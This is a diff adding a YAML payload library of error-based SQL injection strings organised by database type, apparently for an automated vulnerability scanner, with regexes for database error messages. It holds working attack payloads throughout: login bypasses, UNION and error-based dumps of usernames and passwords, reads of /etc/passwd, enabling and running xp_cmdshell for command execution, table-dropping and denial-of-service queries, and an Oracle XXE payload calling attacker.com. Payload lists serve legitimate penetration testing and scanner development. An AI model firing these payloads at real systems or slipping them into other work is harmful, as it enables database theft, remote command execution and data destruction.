@@ -1,0 +1,1129 @@
+metadata:
+  type: sqli/error_based
+  version: "1.0"
+  description: "Error-based SQL injection payloads organized by DBMS"
+  sources:
+    - "OWASP"
+    - "SQLMap"
+    - "PayloadsAllTheThings"
+    - "PortSwigger"
+
+detection_patterns:
+  - "SQL syntax.*?MySQL"
+  - "Warning.*?mysqli?_"
+  - "You have an error in your SQL syntax"
+  - "Unclosed quotation mark"
+  - "ODBC SQL Server Driver"
+  - "ORA-\\d{5}"
+  - "PostgreSQL.*?ERROR"
+  - "SQLITE_ERROR"
+  - "supplied argument is not a valid MySQL"
+  - "Microsoft OLE DB Provider"
+  - "valid MySQL result"
+  - "MySqlClient\\."
+  - "com\\.mysql\\.jdbc"
+  - "org\\.postgresql\\.util\\.PSQLException"
+  - "System\\.Data\\.OleDb\\.OleDbException"
+
+payloads:
+  mysql:
+    # Basic quote injection
+    - value: "'"
+      description: "Single quote - basic MySQL error test"
+      severity: high
+      tags: [basic, quote]
+
+    - value: "\""
+      description: "Double quote - basic MySQL error test"
+      severity: high
+      tags: [basic, quote]
+
+    - value: "1'"
+      description: "Numeric param single quote"
+      severity: high
+      tags: [basic, quote, numeric]
+
+    - value: "1\""
+      description: "Numeric param double quote"
+      severity: high
+      tags: [basic, quote, numeric]
+
+    - value: "' OR '1'='1"
+      description: "Classic OR tautology"
+      severity: high
+      tags: [basic, boolean]
+
+    - value: "' OR '1'='1' --"
+      description: "OR tautology with comment"
+      severity: high
+      tags: [basic, boolean, comment]
+
+    - value: "' OR '1'='1' /*"
+      description: "OR tautology with multiline comment"
+      severity: high
+      tags: [basic, boolean, comment]
+
+    - value: "') OR ('1'='1"
+      description: "Parenthesis enclosed OR tautology"
+      severity: high
+      tags: [basic, boolean, parenthesis]
+
+    - value: "') OR ('1'='1' --"
+      description: "Parenthesis OR tautology with comment"
+      severity: high
+      tags: [basic, boolean, parenthesis, comment]
+
+    # UNION-based error extraction
+    - value: "' UNION SELECT 1-- -"
+      description: "Basic UNION SELECT test"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT 1,2-- -"
+      description: "UNION SELECT 2 columns"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT 1,2,3-- -"
+      description: "UNION SELECT 3 columns"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT 1,2,3,4-- -"
+      description: "UNION SELECT 4 columns"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT 1,2,3,4,5-- -"
+      description: "UNION SELECT 5 columns"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -"
+      description: "UNION SELECT with NULL columns"
+      severity: high
+      tags: [union]
+
+    # Error-based: EXTRACTVALUE
+    - value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -"
+      description: "EXTRACTVALUE version extraction"
+      severity: critical
+      tags: [error_based, extractvalue]
+
+    - value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -"
+      description: "EXTRACTVALUE database name extraction"
+      severity: critical
+      tags: [error_based, extractvalue]
+
+    - value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))-- -"
+      description: "EXTRACTVALUE user extraction"
+      severity: critical
+      tags: [error_based, extractvalue]
+
+    - value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))-- -"
+      description: "EXTRACTVALUE table name extraction"
+      severity: critical
+      tags: [error_based, extractvalue, enumeration]
+
+    - value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 0,1),0x7e))-- -"
+      description: "EXTRACTVALUE column name extraction"
+      severity: critical
+      tags: [error_based, extractvalue, enumeration]
+
+    - value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1),0x7e))-- -"
+      description: "EXTRACTVALUE data extraction from users"
+      severity: critical
+      tags: [error_based, extractvalue, data_extraction]
+
+    - value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@datadir),0x7e))-- -"
+      description: "EXTRACTVALUE datadir extraction"
+      severity: high
+      tags: [error_based, extractvalue]
+
+    - value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@basedir),0x7e))-- -"
+      description: "EXTRACTVALUE basedir extraction"
+      severity: high
+      tags: [error_based, extractvalue]
+
+    # Error-based: UPDATEXML
+    - value: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -"
+      description: "UPDATEXML version extraction"
+      severity: critical
+      tags: [error_based, updatexml]
+
+    - value: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)-- -"
+      description: "UPDATEXML database extraction"
+      severity: critical
+      tags: [error_based, updatexml]
+
+    - value: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)-- -"
+      description: "UPDATEXML user extraction"
+      severity: critical
+      tags: [error_based, updatexml]
+
+    - value: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1)-- -"
+      description: "UPDATEXML table enumeration"
+      severity: critical
+      tags: [error_based, updatexml, enumeration]
+
+    - value: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e),1)-- -"
+      description: "UPDATEXML column enumeration"
+      severity: critical
+      tags: [error_based, updatexml, enumeration]
+
+    # Error-based: EXP (MySQL 5.5+)
+    - value: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
+      description: "EXP error-based version extraction via FLOOR+RAND"
+      severity: critical
+      tags: [error_based, floor_rand]
+
+    - value: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
+      description: "FLOOR+RAND database extraction"
+      severity: critical
+      tags: [error_based, floor_rand]
+
+    - value: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
+      description: "FLOOR+RAND user extraction"
+      severity: critical
+      tags: [error_based, floor_rand]
+
+    - value: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
+      description: "FLOOR+RAND table extraction"
+      severity: critical
+      tags: [error_based, floor_rand, enumeration]
+
+    - value: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
+      description: "FLOOR+RAND password extraction"
+      severity: critical
+      tags: [error_based, floor_rand, data_extraction]
+
+    # Error-based: EXP function (shorter syntax)
+    - value: "' AND EXP(~(SELECT * FROM (SELECT version())a))-- -"
+      description: "EXP error-based version (compact)"
+      severity: critical
+      tags: [error_based, exp]
+
+    - value: "' AND EXP(~(SELECT * FROM (SELECT database())a))-- -"
+      description: "EXP error-based database (compact)"
+      severity: critical
+      tags: [error_based, exp]
+
+    - value: "' AND EXP(~(SELECT * FROM (SELECT user())a))-- -"
+      description: "EXP error-based user (compact)"
+      severity: critical
+      tags: [error_based, exp]
+
+    - value: "' AND EXP(~(SELECT * FROM (SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1)a))-- -"
+      description: "EXP error-based data extraction"
+      severity: critical
+      tags: [error_based, exp, data_extraction]
+
+    # Stacked queries
+    - value: "'; SELECT version();-- -"
+      description: "Stacked query - SELECT version"
+      severity: high
+      tags: [stacked]
+
+    - value: "'; SELECT database();-- -"
+      description: "Stacked query - SELECT database"
+      severity: high
+      tags: [stacked]
+
+    - value: "'; SELECT user();-- -"
+      description: "Stacked query - SELECT user"
+      severity: high
+      tags: [stacked]
+
+    - value: "'; DROP TABLE IF EXISTS temp_table; CREATE TABLE temp_table(data TEXT);-- -"
+      description: "Stacked query - table manipulation"
+      severity: critical
+      tags: [stacked, destructive]
+
+    - value: "'; SELECT SLEEP(5);-- -"
+      description: "Stacked query - sleep confirmation"
+      severity: high
+      tags: [stacked, time_based]
+
+    # Subquery injection
+    - value: "' AND (SELECT 1 FROM (SELECT version())a)-- -"
+      description: "Subquery version extraction"
+      severity: high
+      tags: [subquery]
+
+    - value: "' AND (SELECT 1 FROM (SELECT database())a)-- -"
+      description: "Subquery database extraction"
+      severity: high
+      tags: [subquery]
+
+    - value: "' AND (SELECT 1 FROM (SELECT user())a)-- -"
+      description: "Subquery user extraction"
+      severity: high
+      tags: [subquery]
+
+    # Comment-based bypass
+    - value: "'/*!50000UNION*//*!50000SELECT*/1,2,3-- -"
+      description: "MySQL version comment UNION SELECT"
+      severity: high
+      tags: [bypass, comment, mysql_specific]
+
+    - value: "'/*!50000UNION*//*!50000SELECT*/1,@@version,3-- -"
+      description: "MySQL version comment version extraction"
+      severity: critical
+      tags: [bypass, comment, mysql_specific]
+
+    - value: "/*!50000UNION*//*!50000SELECT*/1,2,3"
+      description: "Comment bypass without leading quote"
+      severity: high
+      tags: [bypass, comment]
+
+    - value: "' /*!50000OR*/ 1=1-- -"
+      description: "Comment bypass OR clause"
+      severity: high
+      tags: [bypass, comment]
+
+    # MySQL specific functions
+    - value: "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)-- -"
+      description: "ROW+COUNT+CONCAT error-based"
+      severity: critical
+      tags: [error_based, advanced]
+
+    - value: "' UNION SELECT 1,@@version,3,4-- -"
+      description: "UNION SELECT @@version"
+      severity: critical
+      tags: [union, version]
+
+    - value: "' UNION SELECT 1,@@datadir,3,4-- -"
+      description: "UNION SELECT @@datadir"
+      severity: high
+      tags: [union, info]
+
+    - value: "' UNION SELECT 1,@@hostname,3,4-- -"
+      description: "UNION SELECT @@hostname"
+      severity: high
+      tags: [union, info]
+
+    - value: "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"
+      description: "UNION all table names via group_concat"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -"
+      description: "UNION all columns from users table"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -"
+      description: "UNION dump users table"
+      severity: critical
+      tags: [union, data_extraction]
+
+    - value: "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -"
+      description: "UNION LOAD_FILE /etc/passwd"
+      severity: critical
+      tags: [union, file_read]
+
+    - value: "' UNION SELECT 1,LOAD_FILE('/etc/hostname'),3-- -"
+      description: "UNION LOAD_FILE hostname"
+      severity: high
+      tags: [union, file_read]
+
+    - value: "1 AND 1=1"
+      description: "Numeric AND true condition"
+      severity: medium
+      tags: [numeric, boolean]
+
+    - value: "1 AND 1=2"
+      description: "Numeric AND false condition"
+      severity: medium
+      tags: [numeric, boolean]
+
+    - value: "1 OR 1=1"
+      description: "Numeric OR true condition"
+      severity: medium
+      tags: [numeric, boolean]
+
+    - value: "1' AND '1'='1"
+      description: "String AND true condition"
+      severity: medium
+      tags: [string, boolean]
+
+    - value: "1' AND '1'='2"
+      description: "String AND false condition"
+      severity: medium
+      tags: [string, boolean]
+
+    - value: "' OR ''='"
+      description: "Empty string tautology"
+      severity: medium
+      tags: [basic, boolean]
+
+    - value: "admin'--"
+      description: "Classic admin bypass"
+      severity: high
+      tags: [auth_bypass]
+
+    - value: "admin' #"
+      description: "Admin bypass with hash comment"
+      severity: high
+      tags: [auth_bypass]
+
+    - value: "' OR 1=1#"
+      description: "OR bypass with hash comment"
+      severity: high
+      tags: [auth_bypass]
+
+    - value: "' OR 1=1--"
+      description: "OR bypass with dash comment"
+      severity: high
+      tags: [auth_bypass]
+
+    - value: "') OR ('1'='1'--"
+      description: "Parenthesis bypass"
+      severity: high
+      tags: [auth_bypass, parenthesis]
+
+    - value: "') OR ('1'='1'#"
+      description: "Parenthesis bypass with hash"
+      severity: high
+      tags: [auth_bypass, parenthesis]
+
+  postgresql:
+    - value: "'"
+      description: "Single quote - basic PostgreSQL error test"
+      severity: high
+      tags: [basic, quote]
+
+    - value: "\""
+      description: "Double quote - PostgreSQL"
+      severity: high
+      tags: [basic, quote]
+
+    - value: "' OR '1'='1"
+      description: "Classic OR tautology - PostgreSQL"
+      severity: high
+      tags: [basic, boolean]
+
+    - value: "' OR '1'='1' --"
+      description: "OR tautology with comment - PostgreSQL"
+      severity: high
+      tags: [basic, boolean, comment]
+
+    - value: "'; SELECT version();--"
+      description: "Stacked query version"
+      severity: high
+      tags: [stacked]
+
+    - value: "'; SELECT current_database();--"
+      description: "Stacked query current database"
+      severity: high
+      tags: [stacked]
+
+    - value: "'; SELECT current_user;--"
+      description: "Stacked query current user"
+      severity: high
+      tags: [stacked]
+
+    - value: "' UNION SELECT NULL--"
+      description: "UNION NULL test"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT NULL,NULL--"
+      description: "UNION 2 NULLs"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT NULL,NULL,NULL--"
+      description: "UNION 3 NULLs"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT 1,version(),3--"
+      description: "UNION version extraction"
+      severity: critical
+      tags: [union, version]
+
+    - value: "' UNION SELECT 1,current_database(),3--"
+      description: "UNION database extraction"
+      severity: critical
+      tags: [union]
+
+    - value: "' UNION SELECT 1,current_user,3--"
+      description: "UNION user extraction"
+      severity: critical
+      tags: [union]
+
+    - value: "' UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables WHERE table_schema='public'--"
+      description: "UNION all table names"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,string_agg(column_name,','),3 FROM information_schema.columns WHERE table_name='users'--"
+      description: "UNION column names from users"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,string_agg(username||':'||password,','),3 FROM users--"
+      description: "UNION dump users"
+      severity: critical
+      tags: [union, data_extraction]
+
+    - value: "' AND 1=CAST((SELECT version()) AS INT)--"
+      description: "CAST error-based version"
+      severity: critical
+      tags: [error_based, cast]
+
+    - value: "' AND 1=CAST((SELECT current_database()) AS INT)--"
+      description: "CAST error-based database"
+      severity: critical
+      tags: [error_based, cast]
+
+    - value: "' AND 1=CAST((SELECT current_user) AS INT)--"
+      description: "CAST error-based user"
+      severity: critical
+      tags: [error_based, cast]
+
+    - value: "' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS INT)--"
+      description: "CAST error-based table enumeration"
+      severity: critical
+      tags: [error_based, cast, enumeration]
+
+    - value: "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT)--"
+      description: "CAST error-based data extraction"
+      severity: critical
+      tags: [error_based, cast, data_extraction]
+
+    - value: "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--"
+      description: "CAST error-based password extraction"
+      severity: critical
+      tags: [error_based, cast, data_extraction]
+
+    - value: "'; SELECT pg_sleep(5)--"
+      description: "pg_sleep time-based"
+      severity: high
+      tags: [time_based]
+
+    - value: "' AND (SELECT 1 FROM pg_sleep(5)) IS NOT NULL--"
+      description: "pg_sleep conditional"
+      severity: high
+      tags: [time_based]
+
+    - value: "'; SELECT * FROM generate_series(1,5000000)--"
+      description: "Heavy query time-based"
+      severity: medium
+      tags: [time_based, heavy_query]
+
+    - value: "' AND 1=1--"
+      description: "AND true - PostgreSQL"
+      severity: medium
+      tags: [boolean]
+
+    - value: "' AND 1=2--"
+      description: "AND false - PostgreSQL"
+      severity: medium
+      tags: [boolean]
+
+    - value: "' AND CTID='(0,1)'--"
+      description: "CTID-based injection"
+      severity: medium
+      tags: [ctid]
+
+    - value: "' AND 1=CONVERT(int,(SELECT version()))--"
+      description: "CONVERT error-based"
+      severity: critical
+      tags: [error_based]
+
+    - value: "admin'--"
+      description: "Admin bypass - PostgreSQL"
+      severity: high
+      tags: [auth_bypass]
+
+  mssql:
+    - value: "'"
+      description: "Single quote - MSSQL error test"
+      severity: high
+      tags: [basic, quote]
+
+    - value: "\""
+      description: "Double quote - MSSQL"
+      severity: high
+      tags: [basic, quote]
+
+    - value: "' OR '1'='1"
+      description: "OR tautology - MSSQL"
+      severity: high
+      tags: [basic, boolean]
+
+    - value: "' OR '1'='1' --"
+      description: "OR tautology with comment - MSSQL"
+      severity: high
+      tags: [basic, boolean, comment]
+
+    - value: "'; EXEC xp_cmdshell('whoami')--"
+      description: "xp_cmdshell command execution"
+      severity: critical
+      tags: [rce, xp_cmdshell]
+
+    - value: "'; EXEC xp_cmdshell('dir')--"
+      description: "xp_cmdshell directory listing"
+      severity: critical
+      tags: [rce, xp_cmdshell]
+
+    - value: "'; SELECT @@version--"
+      description: "SELECT @@version"
+      severity: critical
+      tags: [version]
+
+    - value: "'; SELECT @@servername--"
+      description: "SELECT server name"
+      severity: high
+      tags: [info]
+
+    - value: "'; SELECT db_name()--"
+      description: "SELECT database name"
+      severity: high
+      tags: [info]
+
+    - value: "'; SELECT system_user--"
+      description: "SELECT system user"
+      severity: high
+      tags: [info]
+
+    - value: "'; SELECT user_name()--"
+      description: "SELECT user name"
+      severity: high
+      tags: [info]
+
+    - value: "' UNION SELECT NULL--"
+      description: "UNION NULL test - MSSQL"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT NULL,NULL--"
+      description: "UNION 2 NULLs - MSSQL"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT NULL,NULL,NULL--"
+      description: "UNION 3 NULLs - MSSQL"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT 1,@@version,3--"
+      description: "UNION version extraction"
+      severity: critical
+      tags: [union, version]
+
+    - value: "' UNION SELECT 1,db_name(),3--"
+      description: "UNION database name"
+      severity: critical
+      tags: [union]
+
+    - value: "' UNION SELECT 1,name,3 FROM master..sysdatabases--"
+      description: "UNION enumerate databases"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,name,3 FROM master..sysobjects WHERE xtype='U'--"
+      description: "UNION enumerate user tables"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,name,3 FROM syscolumns WHERE id=OBJECT_ID('users')--"
+      description: "UNION enumerate columns"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,username+':'+password,3 FROM users--"
+      description: "UNION dump users"
+      severity: critical
+      tags: [union, data_extraction]
+
+    - value: "' AND 1=CONVERT(int,@@version)--"
+      description: "CONVERT error-based version"
+      severity: critical
+      tags: [error_based, convert]
+
+    - value: "' AND 1=CONVERT(int,db_name())--"
+      description: "CONVERT error-based database"
+      severity: critical
+      tags: [error_based, convert]
+
+    - value: "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
+      description: "CONVERT error-based table enumeration"
+      severity: critical
+      tags: [error_based, convert, enumeration]
+
+    - value: "' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--"
+      description: "CONVERT error-based column enumeration"
+      severity: critical
+      tags: [error_based, convert, enumeration]
+
+    - value: "' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--"
+      description: "CONVERT error-based data extraction"
+      severity: critical
+      tags: [error_based, convert, data_extraction]
+
+    - value: "' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--"
+      description: "CONVERT error-based password"
+      severity: critical
+      tags: [error_based, convert, data_extraction]
+
+    - value: "' AND 1=CAST(@@version AS int)--"
+      description: "CAST error-based version"
+      severity: critical
+      tags: [error_based, cast]
+
+    - value: "' AND 1=CAST(db_name() AS int)--"
+      description: "CAST error-based database"
+      severity: critical
+      tags: [error_based, cast]
+
+    - value: "'; WAITFOR DELAY '0:0:5'--"
+      description: "WAITFOR time-based 5s"
+      severity: high
+      tags: [time_based]
+
+    - value: "'; IF 1=1 WAITFOR DELAY '0:0:5'--"
+      description: "Conditional WAITFOR true"
+      severity: high
+      tags: [time_based, conditional]
+
+    - value: "'; IF 1=2 WAITFOR DELAY '0:0:5'--"
+      description: "Conditional WAITFOR false"
+      severity: high
+      tags: [time_based, conditional]
+
+    - value: "'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--"
+      description: "Conditional WAITFOR table exists"
+      severity: high
+      tags: [time_based, conditional, enumeration]
+
+    - value: "' AND 1=1--"
+      description: "AND true - MSSQL"
+      severity: medium
+      tags: [boolean]
+
+    - value: "' AND 1=2--"
+      description: "AND false - MSSQL"
+      severity: medium
+      tags: [boolean]
+
+    - value: "admin'--"
+      description: "Admin bypass - MSSQL"
+      severity: high
+      tags: [auth_bypass]
+
+    - value: "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--"
+      description: "Enable advanced options"
+      severity: critical
+      tags: [configuration]
+
+    - value: "'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--"
+      description: "Enable xp_cmdshell"
+      severity: critical
+      tags: [rce, configuration]
+
+    - value: "' UNION SELECT 1,2,3--"
+      description: "Basic UNION 3 columns"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION ALL SELECT 1,2,3--"
+      description: "UNION ALL 3 columns"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION ALL SELECT 1,@@version,3--"
+      description: "UNION ALL version"
+      severity: critical
+      tags: [union, version]
+
+  oracle:
+    - value: "'"
+      description: "Single quote - Oracle error test"
+      severity: high
+      tags: [basic, quote]
+
+    - value: "\""
+      description: "Double quote - Oracle"
+      severity: high
+      tags: [basic, quote]
+
+    - value: "' OR '1'='1"
+      description: "OR tautology - Oracle"
+      severity: high
+      tags: [basic, boolean]
+
+    - value: "' OR '1'='1' --"
+      description: "OR tautology with comment - Oracle"
+      severity: high
+      tags: [basic, boolean, comment]
+
+    - value: "' UNION SELECT NULL FROM DUAL--"
+      description: "UNION NULL from DUAL"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT NULL,NULL FROM DUAL--"
+      description: "UNION 2 NULLs from DUAL"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT NULL,NULL,NULL FROM DUAL--"
+      description: "UNION 3 NULLs from DUAL"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT 1,banner,3 FROM v$version WHERE ROWNUM=1--"
+      description: "UNION version extraction"
+      severity: critical
+      tags: [union, version]
+
+    - value: "' UNION SELECT 1,user,3 FROM DUAL--"
+      description: "UNION current user"
+      severity: critical
+      tags: [union]
+
+    - value: "' UNION SELECT 1,instance_name,3 FROM v$instance--"
+      description: "UNION instance name"
+      severity: high
+      tags: [union, info]
+
+    - value: "' UNION SELECT 1,table_name,3 FROM all_tables WHERE ROWNUM<=10--"
+      description: "UNION table enumeration"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,column_name,3 FROM all_tab_columns WHERE table_name='USERS' AND ROWNUM<=10--"
+      description: "UNION column enumeration"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,username||':'||password,3 FROM users--"
+      description: "UNION dump users"
+      severity: critical
+      tags: [union, data_extraction]
+
+    - value: "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--"
+      description: "CTXSYS error-based version"
+      severity: critical
+      tags: [error_based, ctxsys]
+
+    - value: "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM DUAL))--"
+      description: "CTXSYS error-based user"
+      severity: critical
+      tags: [error_based, ctxsys]
+
+    - value: "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM all_tables WHERE ROWNUM=1))--"
+      description: "CTXSYS error-based table"
+      severity: critical
+      tags: [error_based, ctxsys, enumeration]
+
+    - value: "' AND (SELECT 1 FROM(XMLType('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/xxe\">%remote;]>')) FROM DUAL) IS NOT NULL--"
+      description: "XMLType XXE-based exfiltration"
+      severity: critical
+      tags: [error_based, xmltype, xxe]
+
+    - value: "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--"
+      description: "UTL_INADDR error-based"
+      severity: critical
+      tags: [error_based, utl_inaddr]
+
+    - value: "'; BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',5); END;--"
+      description: "DBMS_PIPE time-based 5s"
+      severity: high
+      tags: [time_based]
+
+    - value: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
+      description: "DBMS_PIPE time-based inline"
+      severity: high
+      tags: [time_based]
+
+    - value: "'; SELECT DBMS_PIPE.RECEIVE_MESSAGE((SELECT banner FROM v$version WHERE ROWNUM=1),5) FROM DUAL--"
+      description: "DBMS_PIPE with subquery"
+      severity: high
+      tags: [time_based]
+
+    - value: "' AND 1=1--"
+      description: "AND true - Oracle"
+      severity: medium
+      tags: [boolean]
+
+    - value: "' AND 1=2--"
+      description: "AND false - Oracle"
+      severity: medium
+      tags: [boolean]
+
+    - value: "admin'--"
+      description: "Admin bypass - Oracle"
+      severity: high
+      tags: [auth_bypass]
+
+    - value: "' UNION SELECT 1,2,3 FROM DUAL--"
+      description: "Basic UNION 3 columns"
+      severity: high
+      tags: [union]
+
+    - value: "' ORDER BY 1--"
+      description: "ORDER BY column count"
+      severity: medium
+      tags: [union, column_enum]
+
+    - value: "' ORDER BY 10--"
+      description: "ORDER BY 10"
+      severity: medium
+      tags: [union, column_enum]
+
+  sqlite:
+    - value: "'"
+      description: "Single quote - SQLite error test"
+      severity: high
+      tags: [basic, quote]
+
+    - value: "\""
+      description: "Double quote - SQLite"
+      severity: high
+      tags: [basic, quote]
+
+    - value: "' OR '1'='1"
+      description: "OR tautology - SQLite"
+      severity: high
+      tags: [basic, boolean]
+
+    - value: "' OR '1'='1' --"
+      description: "OR tautology with comment - SQLite"
+      severity: high
+      tags: [basic, boolean, comment]
+
+    - value: "' UNION SELECT NULL--"
+      description: "UNION NULL test"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT NULL,NULL--"
+      description: "UNION 2 NULLs"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT NULL,NULL,NULL--"
+      description: "UNION 3 NULLs"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION SELECT 1,sqlite_version(),3--"
+      description: "UNION version extraction"
+      severity: critical
+      tags: [union, version]
+
+    - value: "' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--"
+      description: "UNION table enumeration from sqlite_master"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,sql,3 FROM sqlite_master WHERE type='table'--"
+      description: "UNION schema extraction"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,group_concat(name,','),3 FROM sqlite_master WHERE type='table'--"
+      description: "UNION all table names"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,group_concat(name,','),3 FROM pragma_table_info('users')--"
+      description: "UNION column names from users"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,username||':'||password,3 FROM users--"
+      description: "UNION dump users"
+      severity: critical
+      tags: [union, data_extraction]
+
+    - value: "' AND 1=1--"
+      description: "AND true - SQLite"
+      severity: medium
+      tags: [boolean]
+
+    - value: "' AND 1=2--"
+      description: "AND false - SQLite"
+      severity: medium
+      tags: [boolean]
+
+    - value: "admin'--"
+      description: "Admin bypass - SQLite"
+      severity: high
+      tags: [auth_bypass]
+
+    - value: "' UNION SELECT 1,2,3--"
+      description: "Basic UNION 3 columns"
+      severity: high
+      tags: [union]
+
+    - value: "1' AND '1'='1"
+      description: "String AND true"
+      severity: medium
+      tags: [boolean]
+
+    - value: "1' AND '1'='2"
+      description: "String AND false"
+      severity: medium
+      tags: [boolean]
+
+    - value: "' UNION SELECT 1,hex(sql),3 FROM sqlite_master--"
+      description: "UNION hex-encoded schema"
+      severity: high
+      tags: [union, enumeration]
+
+    - value: "' AND 1=randomblob(100000000)--"
+      description: "Heavy query DoS"
+      severity: medium
+      tags: [dos]
+
+  generic:
+    - value: "' OR 1=1--"
+      description: "Generic OR tautology"
+      severity: high
+      tags: [basic, boolean, polyglot]
+
+    - value: "' OR 1=1#"
+      description: "OR tautology with hash"
+      severity: high
+      tags: [basic, boolean, polyglot]
+
+    - value: "' OR 1=1/*"
+      description: "OR tautology with multiline comment"
+      severity: high
+      tags: [basic, boolean, polyglot]
+
+    - value: "') OR 1=1--"
+      description: "Parenthesis OR tautology"
+      severity: high
+      tags: [basic, boolean, polyglot]
+
+    - value: "') OR 1=1#"
+      description: "Parenthesis OR with hash"
+      severity: high
+      tags: [basic, boolean, polyglot]
+
+    - value: "1 OR 1=1"
+      description: "Numeric OR tautology"
+      severity: high
+      tags: [basic, boolean, numeric, polyglot]
+
+    - value: "1 OR 1=1--"
+      description: "Numeric OR with comment"
+      severity: high
+      tags: [basic, boolean, numeric, polyglot]
+
+    - value: "' UNION SELECT 1,2,3--"
+      description: "Generic UNION 3 columns"
+      severity: high
+      tags: [union, polyglot]
+
